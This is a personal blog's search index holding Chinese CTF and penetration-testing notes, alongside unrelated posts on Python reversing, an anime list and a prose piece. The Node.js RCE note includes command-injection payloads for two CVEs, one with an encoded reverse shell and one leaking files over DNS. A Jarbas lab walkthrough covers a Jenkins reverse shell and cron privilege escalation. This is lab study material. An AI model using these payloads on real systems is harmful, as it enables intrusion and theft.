var tipuesearch = {"pages":[{"title":"Node.js RCE 漏洞总结","url":"/posts/2767279470/","text":"命令执行 使用 child_process 子进程 执行系统指令 如果有使用 eval 函数则可以使用以下方式执行系统指令 ?eval=require('child_process').execSync('cmd').toString() 以上指令详细解释： require('child_process') 用于导入 Node.js 的 child_process 模块。 注：Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令 execSync('cmd') 同步执行其中的指令 toString() 将返回的对象转换为字符串类型 若过滤了exec，还有 spawnSync 用法和详细解释如下 eval=require(&quot;child_process&quot;).spawnSync('cmd',['args']).stdout.toString() require('child_process') 同上 spawnSync('cmd',['args']) 同步执行 cmd 命令，数组内容是参数 stdout 访问子进程的标准输出，它是一个缓冲区（Buffer）对象。 toString() 方法将缓冲区转换为字符串，使输出内容可读。 例题 CTFshow - web335 CTFshow - web336 Node.js CVE 的复现 CVE-2017-16082 原理 详细请见 node.js + postgres 从注入到Getshell 简述：获取数据库字段名并处理时将字段名作为参数传入 Function 类中，搭配 SQL 注入即可通过其创建的函数来远程执行代码 复现 靶机地址： https://github.com/vulhub/vulhub/blob/master/node/CVE-2017-16082/README.zh-cn.md Payload： SELECT 1 AS &quot;\\']=0;require=process.mainModule.constructor._load;/*&quot;, 2 AS &quot;*/p=require(`child_process`);/*&quot;, 3 AS &quot;*/p.exec(`echo YmFzaCAtaSA+JiAvZGV2L3Rj`+/*&quot;, 4 AS &quot;*/`cC8xNzIuMTkuMC4xLzIxIDA+JjE=|base64 -d|bash`)//&quot; 靶机中无法直接控制字段名，但是因为可以多句执行，所以也可以控制传入的字段名 虽然此处返回内部错误，但此处其实已经成功反弹了 shell 注意事项：在传参的过程中要进行 URL 编码后再发送请求，否则无法复现成功 CVE-2021-21315 靶机地址：使用 vulfocus 自建 Payload http://ip:port/api/getServices?name[]=$(&quot;cmd&quot;) 仅需发送 GET 请求即可 在靶机中使用的 Payload 如下： http://127.0.0.1:56430/api/getServices?name[]=$(ping%20`ls%20/tmp`.d247976159.ipv6.bypass.eu.org) 使用 Dnslog 服务，最终得到 flag","tags":"ctf 笔记 node.js rce"},{"title":"Python逆向","url":"/posts/426072920/","text":"常用工具 工欲善其事，必先利其器 pyinstxtractor-ng：用于解压打包好的 exe 文件 pycdc/pycdas：用于反编译 pyc 文件 IDA：逆向 pyd/so 文件 如何判断 可以通过图标来判断，也可以先拖入 IDA 查看，可以看到有很多 Py 开头的引用 几种题型 直接反编译型 一般来说，这种题型不会在放反编译上下太大功夫，而主要考察其它方面，如密码学 通常是打包成exe文件或者直接给pyc文件 解法 pycdc 直接唆 pycdc -o output.py ./input.pyc 如果遇到已经打包好的： pyinstxtractor-ng target.exe 然后找到对应的pyc文件使用pycdc反编译即可 例题 2024 红岩杯 - MniGame 2020 moeCTF - MidPython 字节码类 python 编译后也是有类似汇编的东西的，通过 PVM 来执行这些代码 简单来说就是虚拟机，跟寒假考核的虚拟机是相似的原理，像这样的虚拟机还有 JVM，处理 Java Class 文件的 解法 这类型的题目分为两种，一种是直接给字节码的文本文件，需要自己翻译成普通的 Python 代码 ， 还有一种就是 pycdc 无法正常反编译时，需要使用 pycdas 来读取汇编理解程序 这样的题目主要在于如何理解程序，好在 Python 汇编比较好理解，也有对应的文档可查 使用 uTools 软件安装 Python 文档插件，然后输入 opcode 对应汇编语句 即可查询对应用法 例题 2021 ZJCTF - crackPYC 第二届黄河流域网络安全技能挑战赛 - ezpyc pyd/so 逆向 (Cython) 最难的部分 首先讲一下 Cython 的原理，Cython 是一个 Python 扩展或者说是另一种编程语言，这取决于你怎么去使用它，使用 Cython 可以加快程序的运行速度 Cython 的一个用法是先将一个 Python 文件翻译为 C 语言文件，然后再编译为 pyd(WIindows)/so(Linux) ，最后在需要的 Python 文件中引入这些动态链接库 另外一个用法是直接使用由 C 编译好的库 还有一个就是将其当作一个结合了 C 和 Python 的编程语言，源码文件后缀为 pyx 在逆向实践中，主要是对 pyd/so 文件进行逆向，但是为了兼容 Python 的动态类型、面向对象等特性，Cython 生成的 C 源码加入了大量的兼容性内容，可读性很差，更不用说逆向之后了 Cython 视频：BV1JQiCY9ELX BV1J2BJYoEGo 解法 参考：系统讲解pyd逆向/Cython逆向 分析 pyd 文件进行信息搜集，确认 Python 版本，函数名等 可以通过编写另外一个python程序并引用此pyd文件，然后dir查看 也可以导入 IDA 然后查找字符串 linux编译一份相同python版本的so文件，ida载入，File-&gt;Produce File-&gt;Create C Header File导出结构体 加载需要逆向的pyd，File-&gt;Load File-&gt;Parse C Header File，导入so文件导出xxx.h(有错误就修复)，导入so文件导出的xxx.h是因为错误比较少，windows带调试符号导出的header错误较多比较难修复 windows编译一份带调试信息的pyd，ida导出idb，bindiff载入 定位__Pyx_CreateStringTabAndInitStrings()，还原__pyx_mstate结构体(python变量名) 定位_Pyx_InitConstants()，还原__pyx_mstate结构中的整数成员 定位到核心函数，动态调试 根据调用Cython api的库函数，重新定义变量类型为导入的结构体，来高效还原python代码 动态调试，frida hook等 可能还有其它方法，有待研究 例题 2024-CCB-CISCN-Quals - cython 2024-CCB-CISCN-Quals - rand0m 其它 除了上述的几种，还有 Pyinstaller 打包时加密，或者是对 pyc 加花，改或删 magic_number 等等 不知道之后出题人还会有什么玩法 解法 magic_number：https://www.cnblogs.com/czlnb/p/15118864.html Pyinstaller 打包时加密：详细解法/简述：先解包，然后找crypto_key(含key参数)和archive(含加密过程) pyc 加花：可能需要16进制编辑去花 有些解法还要搭配动态调试等食用","tags":"ctf 笔记 逆向 信安"},{"title":"花指令笔记","url":"/posts/1856646162/","text":"花指令是什么 简单来说就是用来干扰反编译器进行分析的一些代码小技巧 要说专业一点的话就是： 花指令是企图隐藏掉不想被逆向工程的代码块(或其它功能)的一种方法, 在真实代码中插入一些垃圾代码的同时还保证原有程序的正确执行, 而程序无法很好地反编译, 难以理解程序内容, 达到混淆视听的效果。 花指令通常用于加大静态分析的难度。 [1] 常见花指令类别 抵消型花指令 这类花指令一般不会影响分析，但是可能会影响栈平衡 这类花指令通常要注意两个方面，逆运算与栈平衡 常见的逆运算： push-pop（压栈-出栈） add-sub adc-sbb （加法-减法 进位加法-借位减法） mul-div imul-idiv （乘法-除法 整数乘法-整数除法） inc-dec （加1-减1） shl-shr （左移-右移） xor-xor (异或) not-not (取反) jmp db型花指令 这类花指令可能不太会影响到 IDA 的分析，但有可能会影响到其它逆向分析软件，尤其是使用线性扫描算法的软件 这类花指令分为无条件跳转、条件跳转和干扰分析型 比较需要注意的是干扰分析型 一个栗子： start: xor eax,eax; test eax,eax; jz label0; jnz label1; label 0: db 0E8h label 1: xor eax,3; add eax,3; ........... 花指令去除步骤 手动去除 找到花指令 nop 掉，然后选择先前为分析成功的部分，先按 P 转换为函数，再尝试将重新分析后的程序转换为伪代码 具体可参考这篇文章 脚本去除 有时候遇到工作量比较大时可以使用脚本去除，如果是比较简单的花指令使用脚本也可以提高效率 要使用脚本需要先将对应的脚本拷到 IDA 对应的文件夹里 然后在 Edit -&gt; Plugins -&gt; 插件名 使用 我使用了 NoMoreFlower ，这个可以去除一些基本的花指令 如想更详细的了解请阅读这篇文章：https://bbs.kanxue.com/thread-279604.htm ↩︎","tags":"ctf 网安 笔记 汇编 逆向"},{"title":"Jarbas 渗透测试笔记","url":"/posts/2575785019/","text":"靶机地址：https://download.vulnhub.com/jarbas/Jarbas.zip 渗透过程 拿到靶机开机第一件事就是就是找到靶机，先用 nmap 扫一下同一网段的机子 $ nmap 10.0.2.0/24 Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-21 02:01 EST Nmap scan report for 10.0.2.1 Host is up (0.000034s latency). Not shown: 999 closed tcp ports (reset) PORT STATE SERVICE 53/tcp open domain MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC) Nmap scan report for 10.0.2.2 Host is up (0.000063s latency). Not shown: 993 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 139/tcp open netbios-ssn 445/tcp open microsoft-ds 631/tcp open ipp 902/tcp open iss-realsecure 24800/tcp open unknown MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC) Nmap scan report for 10.0.2.3 Host is up (0.000042s latency). All 1000 scanned ports on 10.0.2.3 are in ignored states. Not shown: 1000 filtered tcp ports (proto-unreach) MAC Address: 08:00:27:A3:71:23 (PCS Systemtechnik/Oracle VirtualBox virtual NIC) Nmap scan report for 10.0.2.15 Host is up (0.000049s latency). Not shown: 996 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 3306/tcp open mysql 8080/tcp open http-proxy MAC Address: 08:00:27:FE:DD:8E (PCS Systemtechnik/Oracle VirtualBox virtual NIC) Nmap scan report for 10.0.2.5 Host is up (0.0000020s latency). All 1000 scanned ports on 10.0.2.5 are in ignored states. Not shown: 1000 closed tcp ports (reset) Nmap done: 256 IP addresses (5 hosts up) scanned in 2.32 seconds 访问两个开放了 80 端口的机子可以知道目标机器是10.0.2.15 找到目标后进行更进一步的扫描 $ nmap 10.0.2.15 -sV -sT -O Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-21 02:03 EST Nmap scan report for 10.0.2.15 Host is up (0.00049s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) 3306/tcp open mysql MariaDB 10.3.23 or earlier (unauthorized) 8080/tcp open http Jetty 9.4.z-SNAPSHOT MAC Address: 08:00:27:FE:DD:8E (PCS Systemtechnik/Oracle VirtualBox virtual NIC) Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.2 - 4.14 Network Distance: 1 hop OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.00 seconds 获取到有 OpenSSH 7.4 Apache httpd 2.4.6 MariaDB 10.3.23 Jetty 9.4.z-SNAPSHOT 等服务，系统版本是 Linux 3.2 - 4.14 ，报告中也可以知道是 CentOS 这个发行版（其实启动靶机的时候就知道了） 除了 TCP 要扫，UDP 也要扫 $ nmap 10.0.2.15 -sU Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-21 02:05 EST Stats: 0:00:52 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 6.20% done; ETC: 02:19 (0:13:22 remaining) Stats: 0:02:18 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 14.30% done; ETC: 02:21 (0:13:53 remaining) Stats: 0:07:01 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 40.78% done; ETC: 02:22 (0:10:13 remaining) Stats: 0:15:54 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 88.06% done; ETC: 02:23 (0:02:09 remaining) Nmap scan report for 10.0.2.15 Host is up (0.00064s latency). Not shown: 996 closed udp ports (port-unreach) PORT STATE SERVICE 68/udp open|filtered dhcpc 539/udp open|filtered apertus-ldp 998/udp open|filtered puparp 5353/udp open|filtered zeroconf MAC Address: 08:00:27:FE:DD:8E (PCS Systemtechnik/Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 1114.07 seconds 并没有什么特别有用的价值，目前已知有两个站点，一个在80端口，一个在8080端口 访问发现一个是网站主站，一个是管理网站的 两个站点都可以试着目录爆破一下 $ gobuster dir -u http://10.0.2.15 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.0.2.15 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: html,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /index.html (Status: 200) [Size: 32808] /.html (Status: 403) [Size: 207] /access.html (Status: 200) [Size: 359] /.html (Status: 403) [Size: 207] Progress: 429860 / 661683 (64.96%)[ERROR] Get &quot;http://10.0.2.15/60411.html&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers) [ERROR] Get &quot;http://10.0.2.15/60411.php&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers) [ERROR] Get &quot;http://10.0.2.15/Yasasoft%20Dvd%20To%20Vcd%20Avi%20Divx%20Converter%20Magicdvdripper%20v3&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers) [ERROR] Get &quot;http://10.0.2.15/60411&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers) [ERROR] Get &quot;http://10.0.2.15/Yasasoft%20Dvd%20To%20Vcd%20Avi%20Divx%20Converter%20Magicdvdripper%20v3.php&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers) [ERROR] Get &quot;http://10.0.2.15/10691&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers) [ERROR] Get &quot;http://10.0.2.15/10691.html&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers) [ERROR] Get &quot;http://10.0.2.15/10691.php&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers) [ERROR] Get &quot;http://10.0.2.15/74516&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers) [ERROR] Get &quot;http://10.0.2.15/74516.html&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers) Progress: 661680 / 661683 (100.00%) =============================================================== Finished =============================================================== 可以发现有一些比较有趣的页面，access.html （PS: 刚开始扫描没有加 -x 参数，没有扫到目录，加上 -x 以添加后缀后就可以扫到了） 访问 access.html ，可以看到有三个像是 md5 加密值的东西 找解密的网站找一下，发现都能找到 貌似是账号和密码的对应关系，试着在 8080 端口的站点登录，可以发现 eder 这串可以登入 网站使用的是 Jerkins，可以通过构建任务来执行 shell 命令 利用此来反弹 shell 反弹指令执行前要先开启监听 得到 shell 后先查明用户情况 可以看到大部分都是功能性的账户，所以提权的目标是 root 用户 检查一下其他的地方，比如 crontab 发现 crontab 有在用 root 身份每五分钟执行一个脚本，可以通过修改脚本来获取 root 用户的 shell 等待最多五分钟即可得到 root shell，同样的，也要提前开启监听 拿到 shell 后就可以试着找 flag 等文件了 总结 操作上： 在扫描时没有进行全端口扫描，只扫描了低位端口，-p- 参数没有加。虽然有很多服务默认端口都在低位，但不扫描高位的话容易错过可以利用的地方。 目录爆破可能需要备一些字典 8080 端口站点也可以尝试字典爆破 过程难点： 想获取 root shell 的时候有点不好找如何提权，这需要熟悉常见的可利用提权方法 渗透测试之提权篇一 渗透测试之提权篇二（Linux 提权） 渗透测试之提权篇三（Windows 提权） 除了常用提权方法，也需要熟悉常用的反弹 shell 手段 渗透测试之反弹shell合集 其它手段： Jerkins 有许多可以利用的漏洞，本次渗透可以尝试利用 CVE-2019-1003000 有关更多 Jenkins 的漏洞 一些奇技淫巧：通过编辑 grub 以进入 root shell，因为在一般的渗透测试中比较难拿到机器的物理控制权限，所以比较罕见（黑客潜入服务器机房戏码，不过 grub 也可以上密码来着） 端口扫描时还有一个开放的 3306 端口，使用的是 MariaDB ，可以尝试查找可利用的漏洞","tags":"网安 渗透 笔记"},{"title":"2024 红岩杯 CTF WP","url":"/posts/100693146/","text":"开学前忘记迁移 hexo 数据了，几个月都没更新，现在回家不知道发什么，就把之前写的 wp 拉过来凑个数了 Misc Are you a JPG master? step 1 根据提示使用 Java 盲水印来获得 level2.zip 的密码 step 2 有一个 level2.jpg 和 dic.txt 猜测要跑字典，可能是图种或用某种隐写方式隐写了flag 使用 binwalk 未检测出压缩包 使用 stegdetect 检测隐写类型： 未检测出有效隐写类型，猜测使用了 steghide ，尝试使用 stegbrute 跑字典，得到flag HardZip step 1 给了一个 dic.txt ，所以使用 ARCHPR 跑字典 step 2 得到密码，解压得到 第二关.zip 和 hint.txt ，根据 hint.txt ，了解到要用掩码攻击 step 3 得到密码，继续解压得到一个 flag.zip 文件 使用 010editor 查看其十六进制，得知此文件并非伪加密 查看压缩包目录，发现有 flag.txt 和 What's_this.png 两个文件，可以知道要使用明文攻击，因为已知文件中12字节数据，且其中至少8字节连续，即可进行明文攻击 因为 png 头都是一样的，所以我构造了一个 png 头，然后使用 bkcrack 进行明文攻击，得到3个密钥并解密，得到 flag 刚做题时的情形：“我真傻，真的，”蒟蒻抬起他没有神采的眼睛来，接着说。“我单知道明文攻击时候需要一个已知文件；我不知道只要前12字节就能攻击了。我一清早起来就开了电脑，计算flag.txt的crc32值，叫我们的Python脚本开始工作。到了下午，终于给出了12个crc32值相同的字符串，我便开了12个ARPHCR来攻击，过了一阵子没出结果。我急了，CPU内核们都说找不到了，再一看，8个密钥未找到，还有几个还在算呢。。。。”他接着但是呜咽，说不出成句的话来。。 对此，我们伟大的Beta猫学长回复道：成长需要时间 YourCraft 666，这个入开桂了 点击即送flag 点击即送 flag： 290的小秘密 根据题目提示，该图片使用了lsb隐写 使用 stegsolve 打开，这题的信息隐藏在 RGB 三个通道的最低位中，通过 Analyse -&gt; Data Extract 得到flag 5525 根据题目提示采用了 SilentEye 隐写，从压缩包中的 hint.txt 得到密钥为 “Mayday” ，使用 SilentEye 解密，得到flag EasyZip 根据题目描述得知要暴力破解，使用 ARCHPR 暴力破解得到密码： WirrreShark step 1 使用 WirrreShark 打开题目文件 step 2 依次查看各个条目，在第五个条目中发现flag 我图图呢 step 1 题目文件是一个图片，无法打开 使用 010editor 查看 发现文件标头被修改，将其改正 修正后得到图片 step 2 图片宽高不对，需要使用脚本爆破CRC得到宽高 脚本源码： import zlib import struct import argparse import itertools parser = argparse.ArgumentParser() parser.add_argument(&quot;-f&quot;, type=str, default=None, required=True, help=&quot;crc.png&quot;) args = parser.parse_args() bin_data = open(args.f, 'rb').read() crc32key = zlib.crc32(bin_data[12:29]) # 计算crc original_crc32 = int(bin_data[29:33].hex(), 16) # 原始crc if crc32key == original_crc32: # 计算crc对比原始crc print('宽高没有问题!') else: input_ = input(&quot;宽高被改了, 是否CRC爆破宽高? (Y/n):&quot;) if input_ not in [&quot;Y&quot;, &quot;y&quot;, &quot;&quot;]: exit() else: for i, j in itertools.product(range(4095), range(4095)): # 理论上0x FF FF FF FF，但考虑到屏幕实际和cpu，0x 0F FF就差不多了，也就是4095宽度和高度 data = bin_data[12:16] + struct.pack('&gt;i', i) + struct.pack('&gt;i', j) + bin_data[24:29] crc32 = zlib.crc32(data) if(crc32 == original_crc32): # 计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，若相同，则图片大小已经确定 print(f&quot;\\nCRC32: &#123;hex(original_crc32)&#125;&quot;) print(f&quot;宽度: &#123;i&#125;, hex: &#123;hex(i)&#125;&quot;) print(f&quot;高度: &#123;j&#125;, hex: &#123;hex(j)&#125;&quot;) exit(0) 最后得到宽高为： 使用 010editor 编辑宽高，得到完整图片 step 3 在文件尾找到后半部分 flag Crypto Classic_AES 由题目可知采用了AES_ECB加密，并且种子是一个小整数，编写脚本爆破： import random from Crypto.Cipher import AES import base64 import os def generate_key(seed): random.seed(seed) key = bytes([random.randint(0, 255) for _ in range(16)]) return key def decrypt(ciphertext, key): cipher = AES.new(key, AES.MODE_ECB) plaintext = cipher.decrypt(base64.b64decode(ciphertext)) pad_len = plaintext[-1] # 去除 PKCS#7 填充 return plaintext[:-pad_len].decode() if __name__ == &quot;__main__&quot;: flag = &quot;x/xvgy+sXb6I8j96FTT5fgEGT9lMR4XC/zKTvdY77a3Yntdvn1GScfkf/MHziWzI&quot; for seed in range(100000): # 暴力破解种子 try: # 使用try...except...避免无法解码错误退出 key = generate_key(seed) decrypted_flag = decrypt(flag, key) if &quot;Redrock&quot; in decrypted_flag: # 筛选出包含&quot;Redrock&quot;的结果 print(decrypted_flag) break except: pass 得到 flag ： Redrock&#123;6b16bf86-6749-4112-b438-319e4ce7a5c1&#125; Morse_Code 密文： 解密得： What is RSA 文件中有p,q,e,c四个值 From ChatGPT: 在RSA加密算法中，以下是每个符号的含义： p 和 q： 这两个是大素数，用于生成密钥。 选择两个大素数 p 和 q，它们应尽可能随机且保密。 计算 n=p×q，n 是密钥的一部分。 e： 公钥指数（加密指数）。 e 是一个与 ϕ(n)=(p−1)(q−1) 互素的整数，满足 1&lt;e&lt;ϕ(n)。 常见的 e 值是 65537，因为它计算效率高，且足够安全。 c： 密文（ciphertext）。 明文 m 加密后生成的结果 c，计算公式是： c=m^e mod n 补充说明 私钥指数 d：解密指数，用于解密密文。它满足： d×e≡1mod ϕ(n) 解密公式： m=c^d mod n RSA 的核心在于大数分解的困难性。 根据以上内容写出解密脚本代码： from sympy import mod_inverse p = 107838628855654812471413655393398150378995246065154350033910452648032730414023 q = 63326381933899241811507370594269184413864749996932931556519044275437019848179 e = 65537 c = 2614337245710053040032169192794377666429639491165446083830186166080709603975820326607483164927365452151697893098970942225623463372515924991756039075659888 phi_n = (p - 1) * (q - 1) # 计算 n 和 φ(n) n = p * q d = mod_inverse(e, phi_n) # 计算 d m = pow(c, d, n) # 得到明文 # 将得到的明文转为字符串 def int_to_string(m): hex_string = hex(m)[2:] # 转成16进制并去掉 &quot;0x&quot; 前缀 if len(hex_string) % 2: # 确保长度为偶数 hex_string = &quot;0&quot; + hex_string return bytes.fromhex(hex_string).decode('utf-8') # 按照字节解码 # 转换并输出字符串 try: plaintext = int_to_string(m) print(plaintext) except UnicodeDecodeError: print(&quot;无法解码&quot;) 得到 flag ： Redrock&#123;0b46cdfc-4b31-4023-a33d-b8defada9457&#125; real1ty的小秘密 由题目可知是凯撒密码，因为不知道偏移量，所以需要枚举26次得到明文 我解md5真的假的 part1-3和5可通过 [[https://www.somd5.com/]] 查到，part4根据提示，可通过穷举得到原文，穷举代码如下： import hashlib # MD5目标值 target_md5 = &quot;ad5da884551e8e48886ce42b926d7fe8&quot; # 字符来源 special_chars = &quot;!@#$%^&amp;-()&quot; numbers = &quot;0123456789&quot; letters = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot; # 所有可能的组合 for special_pair1 in special_chars: for special_pair2 in special_chars: # 从特殊字符中选2个 for number in numbers: # 从数字中选1个 for letter in letters: # 从字母中选1个 # 拼接成字符串 candidate = '' + special_pair1 + special_pair2 + number + letter # 计算MD5 md5_hash = hashlib.md5(candidate.encode()).hexdigest() # 判断是否匹配 if md5_hash == target_md5: print(f&quot;找到匹配字符串: &#123;candidate&#125;&quot;) break 最终得到flag： youknowmd5isnotsafe%@7D8545 Pwn login step 1 分析程序逻辑，发现输入-1即可得到shell step 2 nc连接输入-1，得到shell real_login 按照提示操作即可 计算猫 手动计算得到 shell Web 这是真签到 F12 大法好 Ping 注入题，输入 1|ls / 查看根目录 发现有flag，尝试查看文件，输入 1|cat /flag 可能是对 flag 关键字做了特殊处理，用模糊匹配就行了 输入 1|cat /fla* 即可 贪吃蛇 打开控制台，给score赋值10000即可 Reverse srand%s Linux远程调试后，得到对应的v4值，并将其输出 #include &lt;stdio.h&gt; int main() &#123; int v3[41]; v3[0] = 53; v3[1] = 163; v3[2] = 13; v3[3] = 1; v3[4] = 62; v3[5] = 156; v3[6] = 33; v3[7] = 151; v3[8] = 72; v3[9] = 190; v3[10] = 222; v3[11] = 221; v3[12] = 194; v3[13] = 195; v3[14] = 208; v3[15] = 46; v3[16] = 26; v3[17] = 168; v3[18] = 49; v3[19] = 150; v3[20] = 113; v3[21] = 219; v3[22] = 223; v3[23] = 184; v3[24] = 78; v3[25] = 99; v3[26] = 29; v3[27] = 11; v3[28] = 91; v3[29] = 249; v3[30] = 163; v3[31] = 185; v3[32] = 38; v3[33] = 20; v3[34] = 101; v3[35] = 196; v3[36] = 91; v3[37] = 96; v3[38] = 154; v3[39] = 39; printf(&quot;Redrock&#123;&quot;); printf(&quot;%c&quot;,0x29u^v3[8]); printf(&quot;%c&quot;,0xCDu^v3[9]); printf(&quot;%c&quot;,0xBAu^v3[10]); printf(&quot;%c&quot;,0xABu^v3[11]); printf(&quot;%c&quot;,0xF2u^v3[12]); printf(&quot;%c&quot;,0xFBu^v3[13]); printf(&quot;%c&quot;,0xE3u^v3[14]); printf(&quot;%c&quot;,0x46u^v3[15]); printf(&quot;%c&quot;,0x7Cu^v3[16]); printf(&quot;%c&quot;,0xC2u^v3[17]); printf(&quot;%c&quot;,0x54u^v3[18]); printf(&quot;%c&quot;,0xF8u^v3[19]); printf(&quot;%c&quot;,0x1Bu^v3[20]); printf(&quot;%c&quot;,0xE8u^v3[21]); printf(&quot;%c&quot;,0xE7u^v3[22]); printf(&quot;%c&quot;,0x8Du^v3[23]); printf(&quot;%c&quot;,0x76u^v3[24]); printf(&quot;%c&quot;,0x5Au^v3[25]); printf(&quot;%c&quot;,0x2Eu^v3[26]); printf(&quot;%c&quot;,0x63u^v3[27]); printf(&quot;%c&quot;,0x33u^v3[28]); printf(&quot;%c&quot;,0x9Fu^v3[29]); printf(&quot;%c&quot;,0xC9u^v3[30]); printf(&quot;%c&quot;,0x9Au^v3[31]); printf(&quot;%c&quot;,0x66u^v3[32]); printf(&quot;%c&quot;,0x32u^v3[33]); printf(&quot;%c&quot;,0xDu^v3[34]); printf(&quot;%c&quot;,0xB7u^v3[35]); printf(&quot;%c&quot;,0x31u^v3[36]); printf(&quot;%c&quot;,0x58u^v3[37]); printf(&quot;%c&quot;,0xA3u^v3[38]); printf(&quot;%c&quot;,0x5Au^v3[39]); &#125; 通过对应的值输出对应的字符 easy 在 IDA 中按下 Shift + F12 查看字符串，即可找到flag 花花的世界 先查壳，但查不到，根据题目描述猜测使用 UPX 壳 无法使用 UPX 直接去壳，使用 010editor 打开发现识别 UPX 的部分被改成了 SRE ，改回去壳即可 反编译使用 NoMoreFlower 去花 再对关键函数按下 P 重构函数，按 F5 得到伪代码 分析代码逻辑，程序将输入进行 RC4 加密，密钥为 flower ，后将其与随机数进异或位运算，最后与预存数组比较 srand种子是取了高位，所以随机数种子短时间不变 最后根据逻辑编写程序算出原RC4密文，再进行解密，得到flag Rc4_py 使用 pyinstxtractor 解包，然后在 ereee 文件发现base64字符串后，又根据题目描述使用rc4解密，密钥为 flag&#123;123321321123badbeef012&#125; ，密文即发现的base64字符串 baby_reverse 走迷宫，程序似乎会对行顺序进行调整 调整后即可得到路径 原文wp：[[https://singularityctf.blogspot.com/2014/03/volgactf-quals-2014-writeup-reverse-100.html]] 这是什么语言 下述操作需要先找到入口 这是仓颉语言，分析貌似使用了RSA或AES，但无法找到对应公私钥和密文，所以使用动态调试，在栈中找到flag 设置断点在解密结束后，在寄存器中找到了flag","tags":"ctf 网安"},{"title":"不能被看见的，雪","url":"/posts/1183353236/","text":"不能被看见的，雪 海南下了一场雪，在这个葱郁的学校。 好像大家都其乐融融，可是还是有小部分人看见了雪，当然，大部分人看不见，也有人假装看不见。 这是一场没有温度的雪，却令人心如刀割。雪并不大，恰恰好雪中有一片不结冰的小池，中间躺着一朵白莲。雪就像眼泪，那么细小，却又那么坚毅。看见雪的人都发着抖，假装看不见的人也发着抖，只可惜，这雪和泪那样的像，泪是最无用的东西，而雪也是。 大家站在水池边祈祷，那是美好的愿望，可白莲仍静静地躺着，他似乎没有听到。假装看不见雪的人自然也假装看不见白莲，若无其事的踩过去，白莲又碎了几瓣，可看见雪的人没办法，因为他们说自己是“假装看见雪的人”。 最后雪也哭了，他恨自己的无用，他太伤心了，于是在这儿落下了所有人都看得见的雨，可那终究不是雪，他愤怒地捶打着大地，又无力地留下了哀嚎，那哀嚎化作雷，向所有看不见雪的人示戚，可是还是没用，他们可以假装看不见雪，也可以假装看不见雷。 雪仍在下，可他说他已经快耗尽了，如果不能所有人都看见雪，那么就再也见不到白莲了。 白莲仍躺着，却再也不能活泼地长大了。 转自抖音号：dyudfdyw7yrk","tags":""},{"title":"追番备份","url":"/posts/4151385849/","text":"还有一年就要高考了,在此做一个追番备份,等考完了再补 2023年7月 死神少爷与黑女仆 第2期 喜欢的人忘记戴眼镜了 公司里的小小前辈 AI电子基因 无职转生 第2期 间谍教室 第2期 Liar・Liar 谎言游戏 满怀美梦的少年是现实主义者 莱莎的炼金工房 白圣女与黑牧师 其实我乃最强？ 总之就是非常可爱 女高篇 2023年10月 间谍过家家 第2期 石纪元 第3期 Part.2 葬送的芙莉莲 晚安 世界 凹凸魔女的母女故事 超超超超喜欢你的100个女孩子 SHY 腼腆英雄 星灵感应 16bit的感动 Another Layer 放学后少年花子君 药屋少女的呢喃 堤亚穆帝国物语 从断头台开始的公主重生后的逆转人生 家里蹲吸血姬的苦闷 我推是反派大小姐 捡到被退婚大小姐的我教会她做坏坏的事 想当冒险者前往大都市的女儿升到了S级 某大叔的VRMMO活动记 经验丰富的你和经验为零的我交往的故事 偶像大师 百万现场 赛马娘 Pretty Derby 第3期 铁路浪漫谭 第2期 想补的番 赛马娘 铁路浪漫谭 妖幻三重奏","tags":"番剧"},{"title":"树莓派搭建哔哩漫游解析服务器","url":"/posts/4060428211/","text":"用树莓派搭建哔哩漫游服务器 准备: 懂得提问过程的脑子 会用搜索引擎的手 耐心 树莓派(或其他能长时间运行的计算机) 魔法 域名 一点点Linux知识 第一步 准备工作 域名:有许多免费申请域名的方法,Bing搜索都有,这里不再赘述,不过比起免费还是建议去购买域名,一年最多就几十块,不算很贵 树莓派:这里我安装了Ubuntu 22.04.1 LTS,下文的许多指令不确定在Ubuntu以外的操作系统有效,尽情留意 魔法:懂的都懂,没有的可以散伙了,建议用付费的,比较稳定,详细的我也不敢说,我怕备案掉了,不过后文的配置文件会提一嘴 第二步 环境搭建 Go编译器安装 